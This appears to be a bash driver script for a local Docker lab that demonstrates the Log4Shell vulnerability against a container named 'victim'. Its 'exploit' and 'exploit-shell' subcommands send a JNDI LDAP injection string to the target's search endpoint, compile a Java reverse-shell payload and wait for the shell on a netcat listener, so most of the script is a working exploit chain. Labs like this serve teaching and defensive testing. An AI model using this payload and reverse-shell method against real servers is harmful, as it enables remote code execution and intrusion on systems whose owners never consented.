#!/bin/bash
set -e

if ! command -v docker &> /dev/null; then
    echo "Error: Docker is not installed"
    exit 1
fi

if command -v docker-compose &> /dev/null; then
    COMPOSE="docker-compose"
else
    COMPOSE="docker compose"
fi

case "$1" in
    build)
        $COMPOSE build
        ;;

    start)
        $COMPOSE up -d
        echo ""
        echo "Services started:"
        echo "  Victim:  http://localhost:8080"
        echo "  LDAP:    localhost:1389"
        echo "  HTTP:    localhost:8888"
        echo ""
        echo "Run './run.sh exploit' to trigger the payload"
        ;;

    stop)
        $COMPOSE down
        ;;

    logs)
        $COMPOSE logs -f
        ;;

    exploit)
        curl -s -G --data-urlencode 'q=${jndi:ldap://ldap:1389/a}' 'http://localhost:8080/search' > /dev/null
        echo "Payload sent. Run './run.sh logs' to see output."
        ;;

    shell)
        if ! docker ps --format '{{.Names}}' | grep -q "^victim$"; then
            echo "Error: Start services first with './run.sh start'"
            exit 1
        fi
        echo "Waiting for reverse shell..."
        echo "Run './run.sh exploit-shell' in another terminal"
        echo ""
        docker run --rm -it --network log4shell_net --name attacker alpine sh -c \
            "apk add --no-cache netcat-openbsd >/dev/null 2>&1 && nc -lvnp 4444"
        ;;

    exploit-shell)
        if ! docker ps --format '{{.Names}}' | grep -q "^attacker$"; then
            echo "Error: Start listener first with './run.sh shell'"
            exit 1
        fi
        # Compile shell payload on the http container
        docker exec http sh -c "cd /app/payloads && cp Exploit_shell.java Exploit.java && javac Exploit.java && rm Exploit.java"
        curl -s -G --data-urlencode 'q=${jndi:ldap://ldap:1389/a}' 'http://localhost:8080/search' > /dev/null
        echo "Sent. Check listener terminal."
        ;;

    reset-payload)
        docker exec http sh -c "cd /app/payloads && cp Exploit_info.java Exploit.java && javac Exploit.java && rm Exploit.java"
        echo "Reset to info-gathering payload."
        ;;

    verify)
        docker exec victim cat /tmp/pwned.txt 2>/dev/null || echo "File not found."
        ;;

    clean)
        $COMPOSE down -v --rmi all 2>/dev/null || true
        docker rm -f attacker 2>/dev/null || true
        ;;

    *)
        echo "Usage: $0 {build|start|stop|logs|exploit|shell|exploit-shell|reset-payload|verify|clean}"
        ;;
esac